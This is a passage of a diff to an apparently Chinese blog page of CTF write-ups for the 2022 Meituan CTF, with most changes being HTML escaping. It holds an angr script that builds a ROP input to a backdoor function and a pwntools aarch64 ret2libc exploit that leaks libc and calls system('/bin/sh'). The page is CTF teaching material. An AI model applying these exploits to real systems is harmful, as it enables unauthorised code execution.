 p.hook_symbol(&quot;input_val&quot;, ReplacementInputVal())
  
-enter = p.factory.entry_state()
-enter.globals[&#39;symbols_count&#39;] = 0
-simgr = p.factory.simgr(enter, save_unconstrained=True)
-d = simgr.explore()
-backdoor = p.loader.find_symbol(&#39;backdoor&#39;).rebased_addr
+enter &#x3D; p.factory.entry_state()
+enter.globals[&#39;symbols_count&#39;] &#x3D; 0
+simgr &#x3D; p.factory.simgr(enter, save_unconstrained&#x3D;True)
+d &#x3D; simgr.explore()
+backdoor &#x3D; p.loader.find_symbol(&#39;backdoor&#39;).rebased_addr
 for state in d.unconstrained:
-    bindata = b&#39;&#39;
-    rsp = state.regs.rsp
-    next_stack = state.memory.load(rsp, 8, endness=p.arch.memory_endness)
-    state.add_constraints(state.regs.rip == ret_rop)
-    state.add_constraints(next_stack == backdoor)
+    bindata &#x3D; b&#39;&#39;
+    rsp &#x3D; state.regs.rsp
+    next_stack &#x3D; state.memory.load(rsp, 8, endness&#x3D;p.arch.memory_endness)
+    state.add_constraints(state.regs.rip &#x3D;&#x3D; ret_rop)
+    state.add_constraints(next_stack &#x3D;&#x3D; backdoor)
     for i in range(state.globals[&#39;symbols_count&#39;]):
-        s, s_type = state.globals[&#39;s_&#39; + str(i)]
-        if s_type == &#39;str&#39;:
-            bb = state.solver.eval(s, cast_to=bytes)
-            if bb.count(b&#39;\x00&#39;) == len(bb):
-                bb = b&#39;A&#39; * bb.count(b&#39;\x00&#39;)
-            bindata += bb
+        s, s_type &#x3D; state.globals[&#39;s_&#39; + str(i)]
+        if s_type &#x3D;&#x3D; &#39;str&#39;:
+            bb &#x3D; state.solver.eval(s, cast_to&#x3D;bytes)
+            if bb.count(b&#39;\x00&#39;) &#x3D;&#x3D; len(bb):
+                bb &#x3D; b&#39;A&#39; * bb.count(b&#39;\x00&#39;)
+            bindata +&#x3D; bb
             print(bb)
-        elif s_type == &#39;int&#39;:
-            bindata += str(state.solver.eval(s, cast_to=int)).encode(&#39;ASCII&#39;) + b&#39; &#39;
-            print(str(state.solver.eval(s, cast_to=int)).encode(&#39;ASCII&#39;) + b&#39; &#39;)
+        elif s_type &#x3D;&#x3D; &#39;int&#39;:
+            bindata +&#x3D; str(state.solver.eval(s, cast_to&#x3D;int)).encode(&#39;ASCII&#39;) + b&#39; &#39;
+            print(str(state.solver.eval(s, cast_to&#x3D;int)).encode(&#39;ASCII&#39;) + b&#39; &#39;)
     print(bindata)
     r.send(bindata)
     r.interactive()
-    break
-</code></pre>
+    break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
-<h2 id="0x03：ret2libc-aarch64"><a href="#0x03：ret2libc-aarch64" class="headerlink" title="0x03：ret2libc_aarch64"></a>0x03：ret2libc_aarch64</h2><pre><code>tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/aarch $ checksec pwn
-[*] &#39;/home/tolele/CTFgame/2022MTCTF/pwn/aarch/pwn&#39;
+<h2 id="0x03：ret2libc-aarch64"><a href="#0x03：ret2libc-aarch64" class="headerlink" title="0x03：ret2libc_aarch64"></a>0x03：ret2libc_aarch64</h2><pre class="line-numbers language-none"><code class="language-none">tolele@tolele-ubuntu22:~&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn&#x2F;aarch $ checksec pwn
+[*] &#39;&#x2F;home&#x2F;tolele&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn&#x2F;aarch&#x2F;pwn&#39;
     Arch:     aarch64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE (0x3f0000)
-</code></pre>
+    PIE:      No PIE (0x3f0000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>一道aarch64指令架构的题，具体的指令可以自行上网搜索。</p>
 <p>用IDA进行静态分析：</p>
-<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
 &#123;
-  int v4; // [xsp+1Ch] [xbp+1Ch]
+  int v4; &#x2F;&#x2F; [xsp+1Ch] [xbp+1Ch]
 
   init(argc, argv, envp);
   do
@@ -485,75 +485,83 @@ for state in d.unconstrained:
     while ( 1 )
     &#123;
       menu();
-      v4 = get_int();
-      if ( v4 == 3 )
+      v4 &#x3D; get_int();
+      if ( v4 &#x3D;&#x3D; 3 )
         exit(0);
-      if ( v4 != 1 )
+      if ( v4 !&#x3D; 1 )
         break;
       puts(&quot;sensible&gt;&gt;&quot;);
-      leak();                                   // 泄露libc基址
+      leak();                                   &#x2F;&#x2F; 泄露libc基址
     &#125;
   &#125;
-  while ( v4 != 2 );
+  while ( v4 !&#x3D; 2 );
   puts(&quot;sensible&gt;&gt;&quot;);
-  overflow();                                   // 栈溢出
+  overflow();                                   &#x2F;&#x2F; 栈溢出
   return 0;
-&#125;
-</code></pre>
-<pre><code class="C">// leak函数
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F; leak函数
 __int64 leak()
 &#123;
-  const char *buf; // [xsp+18h] [xbp+18h] BYREF
+  const char *buf; &#x2F;&#x2F; [xsp+18h] [xbp+18h] BYREF
 
-  buf = 0LL;
+  buf &#x3D; 0LL;
   read(0, &amp;buf, 8uLL);
   return puts(buf);
-&#125;
-</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>leak函数只要输入puts_got，就可以直接泄露libc基址。不过要注意因为该架构下libc地址中有\x00字节产生截断，所以需要加上0x4000000000。</p>
 <br>
 
-<pre><code>// overflow函数
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; overflow函数
 __int64 overflow()
 &#123;
-  char s[128]; // [xsp+10h] [xbp+10h] BYREF
+  char s[128]; &#x2F;&#x2F; [xsp+10h] [xbp+10h] BYREF
 
   printf(&quot;&gt; &quot;);
   gets(s);
   puts(&quot;Your Input: \n&quot;);
   puts(s);
   return 0LL;
-&#125;
-</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>Leak完后会有个overflow函数用于ROP利用。这里我打算使用的gadget是libc里的这段，把/bin/sh的地址放入x0，system函数的地址放入x30，然后ret执行。</p>
 <p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic05.png" alt="pic05"></p>
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;aarch64&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;aarch64&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = process(&quot;./pwn&quot;)
-elf = ELF(&quot;./pwn&quot;)
-libc = ELF(&quot;./libc.so.6&quot;)
-puts_got =elf.got[&#39;puts&#39;]
+io &#x3D; process(&quot;.&#x2F;pwn&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)
+libc &#x3D; ELF(&quot;.&#x2F;libc.so.6&quot;)
+puts_got &#x3D;elf.got[&#39;puts&#39;]
 
 io.sendlineafter(&quot;3.Exit.&quot;, &quot;1&quot;)
 io.sendafter(&quot;sensible&gt;&gt;\n&quot;, p64(puts_got))
-libc_base = u64(io.recv(3).ljust(8, b&#39;\x00&#39;)) + 0x4000000000 - libc.symbols[&#39;puts&#39;]
-print(&quot;@@@ libc_base = &quot; + str(hex(libc_base)))
+libc_base &#x3D; u64(io.recv(3).ljust(8, b&#39;\x00&#39;)) + 0x4000000000 - libc.symbols[&#39;puts&#39;]
+print(&quot;@@@ libc_base &#x3D; &quot; + str(hex(libc_base)))
 
-system = libc_base + libc.symbols[&#39;system&#39;]
-binsh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()
-gadget = libc_base + 0x63e5c
+system &#x3D; libc_base + libc.symbols[&#39;system&#39;]
+binsh &#x3D; libc_base + libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()
+gadget &#x3D; libc_base + 0x63e5c
 io.sendlineafter(&quot;3.Exit.&quot;, &quot;2&quot;)
-payload = b&#39;A&#39;*(128+8) + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)
+payload &#x3D; b&#39;A&#39;*(128+8) + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)
 io.sendlineafter(&quot;sensible&gt;&gt;&quot;, payload)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>在本地打的时候，一开始没打通，调试发现libc的基址竟然时0x55开头，将exp中的0x4000000000改成0x5500000000就好了。难道是环境没模拟好？🤔</p>
 <br>
 
 <h2 id="0x04：题目附件"><a href="#0x04：题目附件" class="headerlink" title="0x04：题目附件"></a>0x04：题目附件</h2><p>2022年第五届美团CTFpwn题附件：</p>
 <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1paNMlzjTSinRXG7adwxDQA">https://pan.baidu.com/s/1paNMlzjTSinRXG7adwxDQA</a><br>提取码：lele</p>
-<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
+<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {
+      tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+          fontCache: 'global'
+      }
+  };
+</script><script>window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
 gtag('config', '');</script></html>
